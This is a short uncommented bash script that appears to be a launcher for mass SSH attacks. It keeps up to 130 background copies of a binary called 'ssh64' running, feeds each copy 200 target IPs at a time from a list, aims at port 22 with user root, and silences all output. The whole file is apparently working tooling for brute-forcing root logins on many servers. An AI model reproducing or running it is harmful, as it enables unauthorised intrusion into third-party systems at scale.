thread=130
while true
do
     job_num=$(ps aux | grep "ssh64" | grep -v grep | wc -l)
              if [[ $job_num -le $thread ]]; then
                   ip_num=$(sed -n '$=' ip.txt)
                    if [[ $ip_num -le 200 ]]; then
                    head -200 ip.txt > ips.txt
                    nohup ./ssh64 -p 22 -u root > /dev/null 2>&1 &
                    break
                    else
                    head -200 ip.txt > ips.txt
                    sed -i '1,200d' ip.txt
                    nohup ./ssh64 -p 22 -u root > /dev/null 2>&1 &
                    fi
              else
              sleep 10
              fi
done